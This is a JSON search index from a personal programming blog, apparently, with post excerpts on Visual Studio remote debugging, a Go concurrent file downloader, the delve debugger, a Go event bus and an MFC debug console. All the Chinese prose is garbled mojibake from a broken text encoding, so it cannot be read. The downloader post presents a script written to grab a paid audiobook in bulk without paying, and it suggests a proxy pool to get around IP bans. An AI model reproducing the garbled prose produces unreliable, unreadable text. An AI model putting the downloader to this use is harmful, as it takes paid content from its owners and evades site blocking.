â€“\u003eè¿œç¨‹Windowsè°ƒè¯•å™¨ é…ç½®: è¿œç¨‹å‘½ä»¤: åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šå¦‚ä½•è¿è¡Œçš„ä½ ç¨‹åº. æˆ‘ä»¬è¿œç¨‹æœºå™¨é€šè¿‡è®¿é—®æœ¬åœ°æœºå™¨çš„å…±äº«ç›®å½•æ¥è®¿é—®, æ‰€ä»¥å¡«å†™ \\\\192.168.0.200\\to_debug\\mycode\\debug\\app.exe å·¥ä½œç›®å½•\\\\192.168.0.200\\to_debug\\mycode\\debug è¿œç¨‹æœåŠ¡åç§°: XXXX å°±æ˜¯ä¸Šä¸€æ­¥ä¸­çš„æœåŠ¡åç§°å’Œç«¯å£, ä¾‹å¦‚ ADMIN-PC:4026 éƒ¨ç½²ç›®å½•, æ— éœ€å¡«å†™, æˆ‘ä»¬ä¸éœ€è¦éƒ¨ç½²å’Œæ‹·è´, å› ä¸ºç¼–è¯‘å’Œè¿è¡Œæœ¬æ¥å°±åœ¨åŒä¸€ç›®å½• ","date":"2022-07-27","objectID":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/:2:4","tags":["vs","vc++"],"title":"Visual Studio VC++ è¿œç¨‹è°ƒè¯•","uri":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"},{"categories":["windows"],"content":"è°ƒè¯• å¹³æ—¶æˆ‘ä»¬è°ƒè¯•æ—¶ç»¿è‰²ç®­å¤´æ—è¾¹é€‰æ‹©çš„æ—¶æœ¬åœ°è°ƒè¯•å™¨, è¿™é‡Œåˆ‡æ¢æˆè¿œç¨‹Windowsè°ƒè¯•å™¨ å¦‚æœå‡ºç°: æ— æ³•å¯åŠ¨ç¨‹åºxxxã€‚ è¢«è°ƒç”¨çš„å¯¹è±¡å·²ä¸å…¶å®¢æˆ·ç«¯æ–­å¼€è¿æ¥ã€‚ åˆ™é‡å¯VS. ","date":"2022-07-27","objectID":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/:2:5","tags":["vs","vc++"],"title":"Visual Studio VC++ è¿œç¨‹è°ƒè¯•","uri":"/visutal-studio-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"},{"categories":["golang"],"content":"goè¯­è¨€å†™çš„ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½è„šæœ¬ æ™šä¸Šæƒ³å¬ç‚¹æœ‰å£°å°è¯´, è¦ä¸¤æ¯›ä¸€é›†, ç®—äº†ä¸€ä¸‹,ä¸€æœ¬ä¹¦è¦å‡ ç™¾å—, å›Šä¸­ç¾æ¶©, äºæ˜¯æ‹¿å‡ºç”µè„‘æä¸ªè„šæœ¬ ","date":"2022-07-22","objectID":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:0:0","tags":["http","crawler"],"title":"Golangæ–‡ä»¶ä¸‹è½½","uri":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":["golang"],"content":"å•åç¨‹ä¸‹è½½ package main import ( \"bufio\" \"io\" \"log\" \"net/http\" \"os\" ) func download(title string) { outputFile := \"./output/\" + title // if file exists, skip if _, err := os.Stat(outputFile); err == nil { log.Println(\"File exists, skip: \", outputFile) return } url := \"https://é©¬èµ›å…‹xxxx/ç‰§ç¥è®°/\" + title log.Println(\"Downloading: \", url) resp, err := http.Get(url) if err != nil { log.Println(\"error:\" + err.Error()) } defer func(Body io.ReadCloser) { err := Body.Close() if err != nil { log.Println(\"close body error:\" + err.Error()) } }(resp.Body) file, err := os.OpenFile(outputFile, os.O_CREATE|os.O_WRONLY, 0644) if err != nil { panic(err) } defer func(file *os.File) { err := file.Close() if err != nil { log.Println(\"close file error:\" + err.Error()) } }(file) _, err = io.Copy(file, resp.Body) if err != nil { log.Println(\"copy file error:\" + err.Error()) } //è²Œä¼¼ä¸ä¼šå°IP, å¦‚æœå°ipå¯ä»¥ä½¿ç”¨ https://github.com/Python3WebSpider/ProxyPool //time.Sleep(time.Second * 3) } func main() { //mp3list.txt ä»ç½‘ç«™ä¸»é¡µå¤åˆ¶çš„å°è¯´æ¯ä¸€é›†çš„æ ‡é¢˜åˆ—è¡¨ //0001_å¤©é»‘åˆ«å‡ºé—¨.mp3 //0002_å››çµè¡€.mp3 //0003_ç¥é€š.mp3 //... //çœç•¥æ•°åƒè¡Œ file, err := os.Open(\"mp3list.txt\") if err != nil { panic(err) } defer func(file *os.File) { _ = file.Close() }(file) //read file line by line scanner := bufio.NewScanner(file) for scanner.Scan() { title := scanner.Text() //download file download(title) } } ","date":"2022-07-22","objectID":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:1:0","tags":["http","crawler"],"title":"Golangæ–‡ä»¶ä¸‹è½½","uri":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":["golang"],"content":"å¤šåç¨‹ä¸‹è½½ æ„Ÿè§‰å•åç¨‹å¤ªæ…¢, 20ä¸ªåç¨‹åŒæ—¶ä¸‹è½½å¤šçˆ½â€¦ golangå®ç°èµ·æ¥è¶…çº§ç®€å• ","date":"2022-07-22","objectID":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:2:0","tags":["http","crawler"],"title":"Golangæ–‡ä»¶ä¸‹è½½","uri":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":["golang"],"content":"golang chan æä¸€ä¸ªé˜Ÿåˆ— var queue = make(chan int, 20) ä¸‹è½½å‰å‘é˜Ÿåˆ—é‡Œæ”¾ä¸€ä¸ªå…ƒç´  //download file queue \u003c- 1 go download(title) é˜Ÿåˆ—æœ€å¤šæ”¾20ä¸ªå°±ä¼šé˜»å¡ ä¸‹è½½å®Œæˆæˆ–skipæ—¶å°±ä»é˜Ÿåˆ—ä¸­å¼¹å‡º // if file exists, skip if _, err := os.Stat(outputFile); err == nil { log.Println(\"File exists, skip: \", outputFile) \u003c-queue return } //download finish \u003c-queue é˜Ÿåˆ—ä¸ºç©ºæ—¶, è¡¨ç¤ºä¸‹è½½å®Œæˆ, ç¨‹åºé€€å‡º for true { time.Sleep(time.Second * 2) //if queue is empty, exit if len(queue) == 0 { break } } ","date":"2022-07-22","objectID":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:2:1","tags":["http","crawler"],"title":"Golangæ–‡ä»¶ä¸‹è½½","uri":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":["golang"],"content":"å®Œæ•´ä»£ç  package main import ( \"bufio\" \"io\" \"log\" \"net/http\" \"os\" \"time\" ) var queue = make(chan int, 20) func download(title string) { outputFile := \"./output/\" + title // if file exists, skip if _, err := os.Stat(outputFile); err == nil { log.Println(\"File exists, skip: \", outputFile) \u003c-queue return } url := \"https://é©¬èµ›å…‹xxxx/ç‰§ç¥è®°/\" + title log.Println(\"Downloading: \", url) resp, err := http.Get(url) if err != nil { log.Println(\"error:\" + err.Error()) } defer func(Body io.ReadCloser) { err := Body.Close() if err != nil { log.Println(\"close body error:\" + err.Error()) } }(resp.Body) file, err := os.OpenFile(outputFile, os.O_CREATE|os.O_WRONLY, 0644) if err != nil { panic(err) } defer func(file *os.File) { err := file.Close() if err != nil { log.Println(\"close file error:\" + err.Error()) } }(file) _, err = io.Copy(file, resp.Body) if err != nil { log.Println(\"copy file error:\" + err.Error()) } //è²Œä¼¼ä¸ä¼šå°IP, å¦‚æœå°ipå¯ä»¥ä½¿ç”¨ https://github.com/Python3WebSpider/ProxyPool //time.Sleep(time.Second * 3) //download finish \u003c-queue } func main() { //open file mp3list.txt file, err := os.Open(\"mp3list.txt\") if err != nil { panic(err) } defer func(file *os.File) { _ = file.Close() }(file) //read file line by line scanner := bufio.NewScanner(file) for scanner.Scan() { title := scanner.Text() //download file queue \u003c- 1 go download(title) } for true { time.Sleep(time.Second * 2) //if queue is empty, exit if len(queue) == 0 { break } } } ","date":"2022-07-22","objectID":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:2:2","tags":["http","crawler"],"title":"Golangæ–‡ä»¶ä¸‹è½½","uri":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":["golang"],"content":"ä»£ç†æ±  æˆ‘æœ¬æ¬¡é‡åˆ°çš„ç½‘ç«™å¹¶æ²¡æœ‰WAF (Web Application Firewall), æ‰€ä»¥å¯ä»¥ç‹‚ä¸‹è½½ å¦‚æœé‡åˆ°è¢«å°IPçš„æƒ…å†µ, å¯ä»¥ä½¿ç”¨ä»£ç†æ± : https://github.com/Python3WebSpider/ProxyPool ","date":"2022-07-22","objectID":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:2:3","tags":["http","crawler"],"title":"Golangæ–‡ä»¶ä¸‹è½½","uri":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":["golang"],"content":"æ·±å…¥ç†è§£ æ¬¢è¿é˜…è¯»æœ¬åšå®¢ä¸­çš„ goè¯­è¨€ä¸­channelæ˜¯å¦‚ä½•å·¥ä½œçš„ ","date":"2022-07-22","objectID":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:3:0","tags":["http","crawler"],"title":"Golangæ–‡ä»¶ä¸‹è½½","uri":"/golang%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":["golang"],"content":"delveå°±æ˜¯goè¯­è¨€çš„gdb delveå°±æ˜¯goè¯­è¨€çš„gdb,è™½ç„¶ gdbä¹Ÿå¯ä»¥è°ƒè¯•goç¨‹åº (https://go.dev/doc/gdb). ä½†æ˜¯, ç”¨gdbè°ƒè¯•goç¨‹åºæœ‰è¿™äº›å·²çŸ¥é—®é¢˜: å·²çŸ¥é—®é¢˜ å­—ç¬¦ä¸²pretty printing åªå¯¹å­—ç¬¦ä¸²ç±»å‹è§¦å‘ï¼Œè€Œä¸æ˜¯å¯¹å…¶æ´¾ç”Ÿç±»å‹ã€‚ è¿è¡Œåº“çš„ C éƒ¨åˆ†ç¼ºå°‘ç±»å‹ä¿¡æ¯ã€‚ GDB ä¸ç†è§£ Go çš„åç§°èµ„æ ¼ï¼Œå¹¶å°† â€œfmt.Print â€œè§†ä¸ºå¸¦æœ‰â€. â€œçš„éç»“æ„åŒ–å­—é¢ï¼Œéœ€è¦åŠ ä»¥å¼•å·ã€‚å®ƒå¯¹pkg.(*MyType).Methå½¢å¼çš„æ–¹æ³•ååå¯¹å¾—æ›´å‰å®³ã€‚ ä»Go 1.11å¼€å§‹ï¼Œè°ƒè¯•ä¿¡æ¯é»˜è®¤æ˜¯å‹ç¼©çš„ã€‚æ—§ç‰ˆæœ¬çš„gdbï¼Œä¾‹å¦‚MacOSä¸Šé»˜è®¤æä¾›çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸ç†è§£å‹ç¼©ã€‚ä½ å¯ä»¥ä½¿ç”¨go build -ldflags=-compressdwarf=falseæ¥ç”Ÿæˆæœªå‹ç¼©çš„è°ƒè¯•ä¿¡æ¯ã€‚(ä¸ºäº†æ–¹ä¾¿ï¼Œä½ å¯ä»¥æŠŠ-ldflagsé€‰é¡¹æ”¾åœ¨GOFLAGSç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™æ ·ä½ å°±ä¸å¿…æ¯æ¬¡éƒ½æŒ‡å®šå®ƒ)ã€‚ ä½¿ç”¨ delve https://github.com/go-delve/delve æ›´ç®€å•èˆ’é€‚ ","date":"2022-07-22","objectID":"/%E4%BD%BF%E7%94%A8delve%E5%AF%B9go%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/:0:0","tags":["delev","gdb"],"title":"ä½¿ç”¨delveå¯¹goä»£ç è¿›è¡Œè°ƒè¯•","uri":"/%E4%BD%BF%E7%94%A8delve%E5%AF%B9go%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/"},{"categories":["golang"],"content":"é¦–æ¬¡å®‰è£… go install github.com/go-delve/delve/cmd/dlv@latest ","date":"2022-07-22","objectID":"/%E4%BD%BF%E7%94%A8delve%E5%AF%B9go%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/:1:0","tags":["delev","gdb"],"title":"ä½¿ç”¨delveå¯¹goä»£ç è¿›è¡Œè°ƒè¯•","uri":"/%E4%BD%BF%E7%94%A8delve%E5%AF%B9go%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/"},{"categories":["golang"],"content":"åŸºæœ¬ä½¿ç”¨ å¦‚æœæ˜¯è°ƒè¯•ä¸»ç¨‹åº, cdåˆ°main.goæ‰€åœ¨ç›®å½•, è¿è¡Œ dlv debug å¦‚æœæ˜¯è°ƒè¯•æµ‹è¯•ä»£ç , cdåˆ°*_test.goæ‰€åœ¨ç›®å½•, è¿è¡Œ dlv test ç„¶å å’Œ gdbç”¨æ³•ç±»ä¼¼ break: æ‰“æ–­ç‚¹ b packageName.functionName æˆ– b fileName:lineNumber æ¯”å¦‚ b main.Add, b main.main continue: å¼€å§‹æ‰§è¡Œæˆ–ç»§ç»­æ‰§è¡Œ c (å¼€å§‹æ‰§è¡Œä¹Ÿç”¨c) next :æ‰§è¡Œä¸‹ä¸€è¡Œ n step: å•æ­¥è¿›å…¥ s stepout: å•æ­¥é€€å‡ºso print:æ‰“å° p thevar quité€€å‡ºè°ƒè¯• q æ›´å¤šçš„ https://github.com/go-delve/delve/blob/master/Documentation/cli/README.md ","date":"2022-07-22","objectID":"/%E4%BD%BF%E7%94%A8delve%E5%AF%B9go%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/:2:0","tags":["delev","gdb"],"title":"ä½¿ç”¨delveå¯¹goä»£ç è¿›è¡Œè°ƒè¯•","uri":"/%E4%BD%BF%E7%94%A8delve%E5%AF%B9go%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/"},{"categories":["golang"],"content":"é«˜çº§ä½¿ç”¨ dlv attach - é™„åŠ åˆ°æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹å¹¶å¼€å§‹è°ƒè¯•ã€‚ dlv connect - ç”¨ç»ˆç«¯å®¢æˆ·ç«¯è¿æ¥åˆ°headless debug serverã€‚ dlv core - æ£€æŸ¥ä¸€ä¸ªæ ¸å¿ƒè½¬å‚¨ã€‚ dlv dap - å¯åŠ¨ä¸€ä¸ªé€šè¿‡è°ƒè¯•é€‚é…å™¨åè®®ï¼ˆDAPï¼‰é€šä¿¡çš„æ— å¤´TCPæœåŠ¡å™¨ã€‚ dlv debug - ç¼–è¯‘å¹¶å¼€å§‹è°ƒè¯•å½“å‰ç›®å½•ä¸‹çš„ä¸»åŒ…ï¼Œæˆ–æŒ‡å®šçš„åŒ…ã€‚ dlv exec - æ‰§è¡Œä¸€ä¸ªé¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶å¼€å§‹ä¸€ä¸ªè°ƒè¯•ä¼šè¯ã€‚ dlv replay - å›æ”¾ä¸€ä¸ªrrè·Ÿè¸ªã€‚ dlv run - åºŸå¼ƒçš„å‘½ä»¤ã€‚ä½¿ç”¨â€™debugâ€™ä»£æ›¿ã€‚ dlv test - ç¼–è¯‘æµ‹è¯•äºŒè¿›åˆ¶æ–‡ä»¶å¹¶å¼€å§‹è°ƒè¯•ç¨‹åºã€‚ dlv trace - ç¼–è¯‘å¹¶å¼€å§‹è¿½è¸ªç¨‹åºã€‚ dlv version - æ‰“å°ç‰ˆæœ¬ã€‚ dlv log - å…³äºè®°å½•æ ‡è®°çš„å¸®åŠ© dlv backend - --backend flagçš„å¸®åŠ© ","date":"2022-07-22","objectID":"/%E4%BD%BF%E7%94%A8delve%E5%AF%B9go%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/:3:0","tags":["delev","gdb"],"title":"ä½¿ç”¨delveå¯¹goä»£ç è¿›è¡Œè°ƒè¯•","uri":"/%E4%BD%BF%E7%94%A8delve%E5%AF%B9go%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/"},{"categories":["golang"],"content":"ä¸€ä¸ªç®€å•çš„äº‹ä»¶å¤„ç†ç¨‹åº demoç›®å½•ç»“æ„ . â”œâ”€â”€ events â”‚Â â””â”€â”€ event.go â”œâ”€â”€ go.mod â””â”€â”€ main.go ","date":"2022-07-22","objectID":"/golang%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/:0:0","tags":["event"],"title":"Golangå®ç°ä¸€ä¸ªç®€å•çš„äº‹ä»¶å¤„ç†ç¨‹åº","uri":"/golang%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/"},{"categories":["golang"],"content":"event.go package events type EventHandler func(event Event) type Event interface { GetName() string GetData() interface{} } type EventBus struct { handlers map[string]EventHandler } func NewEventBus() *EventBus { return \u0026EventBus{ handlers: make(map[string]EventHandler), } } func (bus *EventBus) Register(name string, handler EventHandler) { bus.handlers[name] = handler } func (bus *EventBus) Dispatch(event Event) { if handler, ok := bus.handlers[event.GetName()]; ok { handler(event) } } func (bus *EventBus) DispatchAsync(event Event) { go bus.Dispatch(event) } var defaultEventBus *EventBus = nil func init() { if defaultEventBus == nil { defaultEventBus = NewEventBus() } } func DefaultEventBus() *EventBus { return defaultEventBus } ","date":"2022-07-22","objectID":"/golang%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/:1:0","tags":["event"],"title":"Golangå®ç°ä¸€ä¸ªç®€å•çš„äº‹ä»¶å¤„ç†ç¨‹åº","uri":"/golang%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/"},{"categories":["golang"],"content":"demo ","date":"2022-07-22","objectID":"/golang%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/:2:0","tags":["event"],"title":"Golangå®ç°ä¸€ä¸ªç®€å•çš„äº‹ä»¶å¤„ç†ç¨‹åº","uri":"/golang%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/"},{"categories":["golang"],"content":"login.go ä¸€ä¸ªtickeräº‹ä»¶ const TickEventName = \"TickerEvent\" type TickerEvent struct { } func (e TickerEvent) GetName() string { return TickEventName } func (e TickerEvent) GetData() interface{} { return time.Now() } ","date":"2022-07-22","objectID":"/golang%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/:2:1","tags":["event"],"title":"Golangå®ç°ä¸€ä¸ªç®€å•çš„äº‹ä»¶å¤„ç†ç¨‹åº","uri":"/golang%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/"},{"categories":["golang"],"content":"main.go package main import ( \"fmt\" \"simpleEvent/events\" \"time\" ) const TickEventName = \"TickerEvent\" type TickerEvent struct { } func (e TickerEvent) GetName() string { return TickEventName } func (e TickerEvent) GetData() interface{} { return time.Now() } func makeEvents() { ticker := time.NewTicker(time.Second * 1) for true { \u003c-ticker.C //è§¦å‘äº‹ä»¶ events.DefaultEventBus().DispatchAsync(TickerEvent{}) } } func main() { go makeEvents() //ç›‘å¬äº‹ä»¶ events.DefaultEventBus().Register(TickEventName, func(e events.Event) { fmt.Println(\"event received:\", e.GetData()) }) for true { time.Sleep(time.Second * 10) } } è¾“å‡º: event received: 2022-08-08 11:22:48.61607 +0800 CST m=+1.000275696 event received: 2022-08-08 11:22:49.616192 +0800 CST m=+2.000391077 event received: 2022-08-08 11:22:50.616163 +0800 CST m=+3.000355464 event received: 2022-08-08 11:22:51.616159 +0800 CST m=+4.000344450 event received: 2022-08-08 11:22:52.616195 +0800 CST m=+5.000373565 ... ","date":"2022-07-22","objectID":"/golang%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/:2:2","tags":["event"],"title":"Golangå®ç°ä¸€ä¸ªç®€å•çš„äº‹ä»¶å¤„ç†ç¨‹åº","uri":"/golang%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/"},{"categories":["windows"],"content":"å¦‚ä½•è®©MFCçª—ä½“ç¨‹åºå¼¹å‡ºå‘½ä»¤è¡Œçª—å£å¹¶æ‰“å°æ—¥å¿—è¾“å‡º ä¹ æƒ¯äº†linuxä¸Šè¿è¡Œç¨‹åºæ—¶åœ¨terminalä¸­æŸ¥çœ‹æ‰“å°çš„æ—¥å¿—. ä½†åœ¨MFCçª—å£ç¨‹åºä¸­å´ä¸è¡Œ. æŠ˜è…¾äº†ä¸€ä¸‹, ç»“æœå¦‚ä¸‹ ","date":"2022-07-13","objectID":"/mfc%E7%AA%97%E4%BD%93%E7%A8%8B%E5%BA%8F%E5%BC%B9%E5%87%BA%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/:0:0","tags":["vc++"],"title":"MFCçª—ä½“ç¨‹åºå¼¹å‡ºå‘½ä»¤è¡Œçª—å£æ˜¾ç¤ºæ—¥å¿—è¾“å‡º","uri":"/mfc%E7%AA%97%E4%BD%93%E7%A8%8B%E5%BA%8F%E5%BC%B9%E5%87%BA%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/"},{"categories":["windows"],"content":"å¼¹å‡ºå‘½ä»¤è¡Œçª—å£ åœ¨ä¸»ç¨‹åºçš„XXX::InitInstance()å‡½æ•°ä¸­æ·»åŠ  #ifdef _DEBUG if (!AllocConsole()) AfxMessageBox(\"Failed to create the console!\", MB_ICONEXCLAMATION); #endif åœ¨å¯¹åº”çš„XXX::ExitInstance()ä¸­æ·»åŠ  #ifdef _DEBUG if (!FreeConsole()) AfxMessageBox(\"Could not free the console!\"); #endif è¿™æ ·åœ¨DEBUGæ¨¡å¼ä¸‹å¯åŠ¨ç¨‹åºæ—¶, ä¼šå¼¹å‡ºå‘½ä»¤è¡Œçª—å£ ","date":"2022-07-13","objectID":"/mfc%E7%AA%97%E4%BD%93%E7%A8%8B%E5%BA%8F%E5%BC%B9%E5%87%BA%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/:1:0","tags":["vc++"],"title":"MFCçª—ä½“ç¨‹åºå¼¹å‡ºå‘½ä»¤è¡Œçª—å£æ˜¾ç¤ºæ—¥å¿—è¾“å‡º","uri":"/mfc%E7%AA%97%E4%BD%93%E7%A8%8B%E5%BA%8F%E5%BC%B9%E5%87%BA%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/"},{"categories":["windows"],"content":"æ‰“å°æ—¥å¿—(å«æ–‡ä»¶å, ä»£ç è¡Œå·) #define LOG2CONSOLE(X) \\ { \\ std::string file = __FILE__; \\ size_t index; \\ for (index = file.size()-1; index \u003e 0; index--) { \\ if (file[index] == '\\\\') break; \\ } \\ std::string fileName = file.substr(index + 1); \\ std::stringstream ss; \\ ss \u003c\u003c X; \\ std::string s = ss.str(); \\ _cprintf(\"%s:%i %s\\n\", fileName.c_str(), __LINE__, s.c_str()); \\ } 1, æ³¨æ„è¦ä½¿ç”¨å®, è€Œä¸æ˜¯å‡½æ•°, å¦åˆ™ä»£ç æ–‡ä»¶åå’Œä»£ç è¡Œå§‹ç»ˆæ˜¯å®šä¹‰çš„ä½ç½® 2, å®æ¢è¡Œçš„è¯, é™¤äº†æœ€åä¸€ä¸ªå¤§æ‹¬å·, æ¯ä¸€è¡Œåé¢éƒ½è¦æ¥ä¸€ä¸ª \\ ","date":"2022-07-13","objectID":"/mfc%E7%AA%97%E4%BD%93%E7%A8%8B%E5%BA%8F%E5%BC%B9%E5%87%BA%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/:2:0","tags":["vc++"],"title":"MFCçª—ä½“ç¨‹åºå¼¹å‡ºå‘½ä»¤è¡Œçª—å£æ˜¾ç¤ºæ—¥å¿—è¾“å‡º","uri":"/mfc%E7%AA%97%E4%BD%93%E7%A8%8B%E5%BA%8F%E5%BC%B9%E5%87%BA%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/"},{"categories":["windows"],"content":"ä½¿ç”¨ LOG2CONSOLE(\"[Clicked] my button clicked. the xxx value is:\" \u003c\u003c something); ","date":"2022-07-13","objectID":"/mfc%E7%AA%97%E4%BD%93%E7%A8%8B%E5%BA%8F%E5%BC%B9%E5%87%BA%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/:3:0","tags":["vc++"],"title":"MFCçª—ä½“ç¨‹åºå¼¹å‡ºå‘½ä»¤è¡Œçª—å£æ˜¾ç¤ºæ—¥å¿—è¾“å‡º","uri":"/mfc%E7%AA%97%E4%BD%93%E7%A8%8B%E5%BA%8F%E5%BC%B9%E5%87%BA%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/"},{"categories":["windows"],"content":"ä½¿ç”¨printf ä¸Šé¢çš„å®ä¸­ä½¿ç”¨çš„æ˜¯ _cprintf, æˆ‘å‘ç°åœ¨æŸäº›æ—¶å€™, å³ä¾¿è¾“å‡ºçš„æ˜¯asciiå­—ç¬¦, ä¹Ÿä¼šå‡ºç°ä¹±ç . æ”¹æˆprintfåˆæ‰“å°ä¸å‡ºæ¥, ä¸ºäº†è®©printfèƒ½æ‰“å°å‡ºæ¥, ä¿®æ”¹: #ifdef _DEBUG if (!AllocConsole()) AfxMessageBox(\"Failed to create the console!\", MB_ICONEXCLAMATION); #endif ä¸º #ifdef _DEBUG AllocConsole(); //freopen(\"CONIN$\", \"r\", stdin); freopen(\"CONOUT$\", \"w\", stdout); freopen(\"CONOUT$\", \"w\", stderr); #endif ","date":"2022-07-13","objectID":"/mfc%E7%AA%97%E4%BD%93%E7%A8%8B%E5%BA%8F%E5%BC%B9%E5%87%BA%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/:4:0","tags":["vc++"],"title":"MFCçª—ä½“ç¨‹åºå¼¹å‡ºå‘½ä»¤è¡Œçª—å£æ˜¾ç¤ºæ—¥å¿—è¾“å‡º","uri":"/mfc%E7%AA%97%E4%BD%93%E7%A8%8B%E5%BA%8F%E5%BC%B9%E5%87%BA%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/"},{"categories":["windows"],"content":"å…³äºç¼–è¯‘Windows MFC é¡¹ç›®é‡åˆ°çš„Error : WINDOWS.H Already Includedçš„è§£å†³æ–¹æ³• ","date":"2022-07-12","objectID":"/error--windows.h-already-included/:0:0","tags":["vc++"],"title":"Error : WINDOWS.H Already Included","uri":"/error--windows.h-already-included/"},{"categories":["windows"],"content":"ç°è±¡ ä»Šå¤©æ¥åˆ°ä¸€ä¸ªè€æ—§çš„MFCé¡¹ç›®, å®‰è£…windowsè™šæ‹Ÿæœº, VS2010 (çœŸæ˜¯è€æ‰ç‰™å‘€) , æœ€åç¼–è¯‘æ—¶å‡ºç°ä¸€å †å¦‚ä¸‹æŠ¥é”™: 1\u003e 